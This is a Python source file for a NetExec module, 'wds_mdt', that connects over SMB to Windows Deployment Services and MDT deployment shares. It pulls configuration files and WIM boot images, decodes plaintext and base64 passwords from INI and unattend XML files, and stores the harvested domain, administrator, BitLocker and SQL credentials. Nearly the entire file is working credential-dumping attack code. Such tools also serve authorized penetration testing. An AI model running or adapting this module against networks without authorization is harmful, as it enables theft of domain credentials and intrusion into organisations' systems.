from base64 import b64decode
from configparser import ConfigParser, Error as ConfigError
from contextlib import closing
from datetime import datetime
from io import BytesIO
from pathlib import Path, PureWindowsPath
from stat import FILE_ATTRIBUTE_REPARSE_POINT
from xml.etree import ElementTree as ET

from impacket.smb3structs import FILE_READ_DATA
from wim_nxc import WimFile

from nxc.helpers.misc import CATEGORY, decode_text
from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH
from nxc.protocols.smb.remotefile import RemoteFile


class NXCModule:
    """
    Detect WDS/MDT deployment shares and extract credentials from configuration files.

    Inspect REMINST/REMOTEINSTALL and DeploymentShare$ for Bootstrap.ini,
    CustomSettings.ini, Unattend.xml, and candidate WinPE images.
    Download discovered configuration files.
    Extract matching MDT INI and unattended XML files from WIM images, read in place without downloading them.
    Download the WIM images themselves only with DOWNLOAD_WIM=TRUE.
    Report deployment secrets and store complete Windows account credentials.

    Module by:
    @archidote - https://github.com/archidote
    @NeffIsBack - https://github.com/NeffIsBack
    """

    name = "wds_mdt"
    description = r"Detect PXE WDS/MDT SMB shares (REMINST\, DeploymentShare$\) and retrieve credentials from deployment files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    # https://learn.microsoft.com/en-us/intune/configmgr/mdt/support-files
    # https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-automation-overview#implicit-answer-file-search-order
    wim_patterns = ("Bootstrap.ini", "CustomSettings.ini", "*unattend*.xml")

    # https://learn.microsoft.com/en-us/intune/configmgr/mdt/properties
    ini_accounts = (
        ("UserID", "UserPassword", "UserDomain"),
        ("DomainAdmin", "DomainAdminPassword", "DomainAdminDomain"),
        ("ADDSUserName", "ADDSPassword", "ADDSUserDomain"),
        ("SMSTSRunCommandLineUserName", "SMSTSRunCommandLineUserPassword", ""),
        ("", "AdminPassword", ""),
    )
    ini_settings = (
        "DBID", "DBPwd", "SQLServer", "Instance", "Database", "Password",
        "SafeModeAdminPassword", "TPMOwnerPassword", "BDEPin",
        "OSDBitLockerRecoveryPassword", "OSDBitLockerStartupKey", "JoinDomain", "MachineObjectOU",
    )

    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-unattendedjoin-identification-credentials
    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-useraccounts
    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-offlineuseraccounts
    xml_accounts = {
        "credentials": "username",
        "autologon": "username",
        "localaccount": "name",
        "administratorpassword": "",
        "offlineadministratorpassword": "",
    }

    def options(self, context, module_options):
        """DOWNLOAD_WIM     Download the WIM images found on the WDS share (default: False)"""
        self.download_wim = module_options.get("DOWNLOAD_WIM", "false").lower() == "true"
        self.output_path = Path(NXC_PATH, "modules", "wds_mdt").resolve()

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        for share in connection.conn.listShares():
            share = share["shi1_netname"].rstrip("\x00")
            if share.lower() in {"reminst", "remoteinstall"}:
                self.explore_wds(share)
            elif share.lower() == "deploymentshare$":
                self.explore_mdt(share)

    def save_file(self, share, path, content=None):
        try:
            local_path = self.output_path / sanitize_path_component(f"{self.connection.hostname}_{self.connection.host}_{PureWindowsPath(path).stem}_{datetime.now().strftime('%Y-%m-%d_%H%M%S_%f')}{PureWindowsPath(path).suffix}")
            local_path = local_path.resolve()
            if not local_path.is_relative_to(self.output_path):
                raise ValueError("Output path escapes the module directory")
            self.output_path.mkdir(parents=True, exist_ok=True)
            with local_path.open("wb") as output:
                if content is None:
                    self.connection.conn.getFile(share, path, output.write)
                else:
                    output.write(content)
            self.context.log.success(f"Saved {share}\\{path} to: {self.output_path}")
        except Exception as e:
            self.context.log.fail(f"Failed to save {share}\\{path}: {e}")

    def explore_wds(self, share):
        self.context.log.display(f"Found share: {share} (should be readable to any authenticated domain user)")
        for path in (r"Boot\x64\Images", r"Boot\x86\Images"):
            try:
                entries = self.connection.conn.listPath(share, f"{path}\\*")
            except Exception as e:
                self.context.log.fail(f"Failed to list {share}\\{path}: {e}")
                continue

            for entry in entries:
                if entry.is_directory() or not entry.get_longname().lower().endswith(".wim"):
                    continue
                self.context.log.success(f"Found WIM image: {share}\\{path}\\{entry.get_longname()} ({entry.get_filesize() / (1024 * 1024):.0f} MB)")
                self.explore_wim(share, f"{path}\\{entry.get_longname()}")
                if self.download_wim:
                    self.save_file(share, f"{path}\\{entry.get_longname()}")

    def explore_wim(self, share, path):
        try:
            self.context.log.display(f"Extracting WIM: {share}\\{path}")
            with closing(RemoteFile(self.connection.conn, path, share, access=FILE_READ_DATA)) as remote_file:
                remote_file.open_file()
                wim = WimFile(remote_file)
                for entry, attributes, digest in wim.files():
                    if attributes & FILE_ATTRIBUTE_REPARSE_POINT or not any(PureWindowsPath(entry).match(pattern) for pattern in self.wim_patterns):
                        continue
                    content = wim.read(digest)
                    self.save_file(share, f"{path}!\\{entry}", content)
                    self.parse_file(content, f"{share}\\{path}!\\{entry}")
        except Exception as e:
            self.context.log.fail(f"Failed to extract WIM {share}\\{path}: {e}")
            if not self.download_wim:
                self.context.log.display("Use DOWNLOAD_WIM=TRUE to download the image and extract it manually")

    def explore_mdt(self, share):
        self.context.log.display(f"Found share: {share} (should require admin access)")
        paths = [r"Control\Bootstrap.ini", r"Control\CustomSettings.ini"]
        try:
            paths.extend(self.connection.spider(share, folder="Control", pattern=["Unattend.xml"]))
        except Exception as e:
            self.context.log.fail(f"Failed to explore {share}\\Control: {e}")

        for path in dict.fromkeys(str(PureWindowsPath(path)) for path in paths):
            content = BytesIO()
            try:
                self.connection.conn.getFile(share, path, content.write)
            except Exception as e:
                self.context.log.fail(f"Failed to read {share}\\{path}: {e}")
                continue
            content = content.getvalue()
            self.save_file(share, path, content)
            self.parse_file(content, f"{share}\\{path}")

    def parse_file(self, content, source):
        try:
            if source.lower().endswith(".ini"):
                self.report_findings(self.parse_ini(content, source))
            elif source.lower().endswith(".xml"):
                self.report_findings(self.parse_xml(content, source))
        except (ConfigError, ET.ParseError, ValueError, LookupError) as e:
            self.context.log.fail(f"Failed to parse {source}: {e}")

    def report_findings(self, findings):
        for source, fields, credentials in findings:
            self.context.log.success(f"Found deployment settings in {source}")
            for key, value in fields.items():
                self.context.log.highlight(f"  {key}={value if value is not None else '<no value>'}")

            for domain, username, password in credentials:
                if not domain and "\\" in username:
                    domain, username = username.split("\\", 1)
                try:
                    self.context.db.add_credential("plaintext", domain, username, password)
                except Exception as e:
                    self.context.log.fail(f"Failed to store credential from {source}: {e}")

    def parse_ini(self, content, source):
        # https://learn.microsoft.com/en-us/intune/configmgr/mdt/use-the-mdt#values-in-the-customsettingsini-file
        parser = ConfigParser(interpolation=None, delimiters=("=",), strict=False, allow_no_value=True, default_section="")
        parser.read_string(decode_text(content))

        for section in parser.values():
            fields = {}
            credentials = []
            for username, password, domain in self.ini_accounts:
                fields.update({key: section[key] for key in (username, password, domain) if key and key in section})
                if section.get(password) is not None and (not username or section.get(username)):
                    credentials.append((section.get(domain) or "", section[username] if username else "Administrator", section[password]))

            fields.update({key: section[key] for key in self.ini_settings if key in section})
            if fields:
                yield source, fields, credentials

    def parse_xml(self, content, source):
        content = ET.fromstring(content)
        for element in content.iter():
            element.tag = element.tag.rsplit("}", 1)[-1].lower()

        for element in content.iter():
            # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-unattendedjoin-identification-machinepassword
            if element.tag == "machinepassword":
                yield source, {"MachinePassword": element.text or ""}, []
            if element.tag not in self.xml_accounts:
                continue
            fields = {child.tag: child.text or "" for child in element if child.tag in {"username", "name", "domain"}}
            credentials = []
            if element.tag == "credentials":
                password = element.findtext("password")
                if password is not None:
                    fields["password"] = password
            else:
                password = element if not self.xml_accounts[element.tag] else element.find("password")
                if password is not None:
                    fields.update({child.tag: child.text or "" for child in password if child.tag in {"value", "plaintext"}})
                    password = self.xml_password(password, source, "Password" if self.xml_accounts[element.tag] else "AdministratorPassword")
                    if password is not None:
                        fields["password"] = password
                        fields.pop("value", None)
                        fields.pop("plaintext", None)

            if password is not None and (not self.xml_accounts[element.tag] or fields.get(self.xml_accounts[element.tag])):
                credentials.append((fields.get("domain", ""), fields[self.xml_accounts[element.tag]] if self.xml_accounts[element.tag] else "Administrator", password))
            if fields:
                yield source, fields, credentials

    def xml_password(self, element, source, suffix):
        # Encoding inferred from Microsoft's examples; PlainText defaults to true.
        # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-autologon-password-plaintext
        # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-offlineuseraccounts-offlineadministratorpassword
        password = element.findtext("value")
        if password is None or element.findtext("plaintext", "true").strip().lower() not in {"false", "0"}:
            return password

        try:
            password = b64decode("".join(password.split()), validate=True).decode("utf-16-le")
            if not password.endswith(suffix):
                raise ValueError(f"Decoded password is missing the {suffix} suffix")
            return password.removesuffix(suffix)
        except ValueError as e:
            self.context.log.fail(f"Failed to decode password in {source}: {e}")
            return None
